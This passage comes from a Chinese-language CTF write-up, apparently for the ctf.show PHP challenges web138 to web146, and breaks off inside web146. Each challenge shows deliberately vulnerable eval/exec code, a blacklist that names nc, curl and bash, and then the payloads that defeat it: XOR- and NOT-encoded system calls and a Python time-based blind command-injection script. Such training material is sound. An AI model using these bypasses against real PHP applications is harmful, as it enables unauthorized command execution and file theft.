punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    die<span class="token punctuation">(</span><span class="token string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>call_user_func<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题在上一题的基础上将:过滤了，然后又重看了下call_user_fun()函数不仅可以传入字符串，还可以传入数组<br><img src="/images/web_138.png"></p><p>所以payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">ctfshow<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>ctfshow<span class="token operator">&amp;</span>ctfshow<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span>getFlag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>右键查看源代码，拿到flag</p><h4 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>function check<span class="token punctuation">(</span>$x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\>|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i'</span><span class="token punctuation">,</span> $x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        die<span class="token punctuation">(</span><span class="token string">'too young too simple sometimes naive!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $c<span class="token operator">=</span>$_GET<span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    check<span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>$c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题在原先的题的基础上ban掉了写的权限，然后看了群主的视频，才知道可以用时间盲注，先做了几个本地测试<br><img src="/images/web_139a.png"></p><p><img src="/images/web_139b.png"></p><p>然后跟着打了一遍脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://08949c28-a6e5-4d46-aeb7-75076f0c8a20.challenge.ctf.show/?c="</span>payload <span class="token operator">=</span> <span class="token string">"if [ `ls / -1 | awk NR==&#123;&#125; | cut -c &#123;&#125;` == &#123;&#125; ];then sleep 3;fi"</span>result <span class="token operator">=</span> <span class="token string">"++++++++++++++++++"</span>row <span class="token operator">=</span> <span class="token number">7</span>length <span class="token operator">=</span> <span class="token number">48</span>strings <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm_-0123456789"</span><span class="token comment">#ctfshow&#123;801ba0c2-5fad-4324-9be3-af824df7867a&#125;</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> strings<span class="token punctuation">:</span>            url1 <span class="token operator">=</span> url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token comment">#print(url1)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span>s                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        result <span class="token operator">+=</span> <span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>出来一个特殊目录，然后直接读取它</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://08949c28-a6e5-4d46-aeb7-75076f0c8a20.challenge.ctf.show/?c="</span>payload <span class="token operator">=</span> <span class="token string">"if [ `cat /f149_15_h3r3 | awk NR==&#123;&#125; | cut -c &#123;&#125;` == &#123;&#125; ];then sleep 3;fi"</span>result <span class="token operator">=</span> <span class="token string">"++++++++++++++++++"</span>row <span class="token operator">=</span> <span class="token number">7</span>length <span class="token operator">=</span> <span class="token number">48</span>strings <span class="token operator">=</span> <span class="token string">"qwertyuiopasdfghjklzxcvbnm_-0123456789"</span><span class="token comment">#ctfshow&#123;801ba0c2-5fad-4324-9be3-af824df7867a&#125;</span><span class="token keyword">for</span> r <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>row<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> s <span class="token keyword">in</span> strings<span class="token punctuation">:</span>            url1 <span class="token operator">=</span> url <span class="token operator">+</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>r<span class="token punctuation">,</span> c<span class="token punctuation">,</span> s<span class="token punctuation">)</span>            <span class="token comment">#print(url1)</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url1<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span>            <span class="token keyword">except</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span>s                <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>                <span class="token keyword">break</span>        result <span class="token operator">+=</span> <span class="token string">" "</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><p><img src="/images/web_139c.png"></p><p>最后去掉空格即可</p><h4 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $f1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $f2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_POST<span class="token punctuation">[</span><span class="token string">'f2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> $f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]+$/'</span><span class="token punctuation">,</span> $f2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $f1($f2());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>intval<span class="token punctuation">(</span>$code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'ctfshow'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看出最后的if里面是一个弱比较，先查看一下弱比较表<br><img src="/images/web_140.png"></p><p>可以看到0在与”php”比较时，为true，而invtal函数会将非数字字符转换为0，所以payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">postf1<span class="token operator">=</span>sha1<span class="token operator">&amp;</span>f2<span class="token operator">=</span>sha2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最后右键源代码，即可拿到flag</p><h4 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/^\W+$/'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在本题中v1v2必须为数字，而v3不能是字母数字，所以可以考虑用异或去构造v3,同时在本地测试一下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?php<span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"phpinfo"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/images/web_141a.png"></p><p>发现可以成功显示</p><p>然后现在需要做的是通过异或去构造相关的命令即可，这里我直接用的是南神博客里的脚本先构造出：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%08"</span><span class="token operator">^</span><span class="token string">"%60%7b"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>即：?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0c%08"</span><span class="token operator">^</span><span class="token string">"%60%7b"</span><span class="token punctuation">)</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_141b.png"></p><p>可以看到出来了一个flag.php，读取它就可以了</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token number">1</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"tac *"</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%08%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7c%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">-</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phperror_reporting<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>highlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        $d <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>$v1 <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span> <span class="token operator">*</span> <span class="token number">0x36d</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        sleep<span class="token punctuation">(</span>$d<span class="token punctuation">)</span><span class="token punctuation">;</span>        echo file_get_contents<span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>该题的意思输入一个字符串后，会去和这几个0X36d乘后，延迟这么久的时间，但如果输入的是0或者负数，就会立刻输出flag，payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>右键查看源代码，就可以看到flag了</p><h4 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到在此题在141的基础ban掉了更多的字符，但^和*没ban,所以我们继续使用异或，继续用南神的脚本跑出所需要的命令</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token string">"%0c%06%0c%0b%05%0d"</span><span class="token operator">^</span><span class="token string">"%7f%7f%7f%7f%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%0b%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7f%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这题在143的基础上修改了一下，v1依旧必须是字符串，v2不能是字母数字下划线，v3的长度必须为1</p><p>所以我们依旧可以重新构造哈即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token string">"%08%02%08%08%05%0d"</span><span class="token operator">^</span><span class="token string">"%7b%7b%7b%7c%60%60"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"%08%01%03%00%06%00"</span><span class="token operator">^</span><span class="token string">"%7c%60%60%20%60%2a"</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v2 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    $v3 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>is_numeric<span class="token punctuation">(</span>$v1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> is_numeric<span class="token punctuation">(</span>$v2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\>|\*|\/|\^|\#|\"/i'</span><span class="token punctuation">,</span> $v3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                die<span class="token punctuation">(</span><span class="token string">'get out hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            $code <span class="token operator">=</span>  <span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"return $v1$v3$v2;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            echo <span class="token string">"$v1$v3$v2 = "</span><span class="token punctuation">.</span>$code<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这一次将异或符号给ban了，但还有取反~在外面，这一次自己手算了一下<br><img src="/images/web_145.png"></p><p>payload：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">?v1<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>v2<span class="token operator">=</span><span class="token number">2</span><span class="token operator">&amp;</span>v3<span class="token operator">=</span>?<span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8c<span class="token operator">%</span><span class="token number">86</span><span class="token operator">%</span>8c<span class="token operator">%</span>8b<span class="token operator">%</span>9a<span class="token operator">%</span><span class="token number">92</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span>8b<span class="token operator">%</span>9e<span class="token operator">%</span>9c<span class="token operator">%</span>df<span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span>d5<span class="token punctuation">)</span><span class="token punctuation">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>拿到flag</p><h4 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">&lt;</span>?phphighlight_file<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> isset<span class="token punctuation">(</span>$_GET<span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    $v1 <span class="token operator">=</span> <span class="token punctuation">(</span>String<span class="token punctuation">)</span>$_GET<span class="token 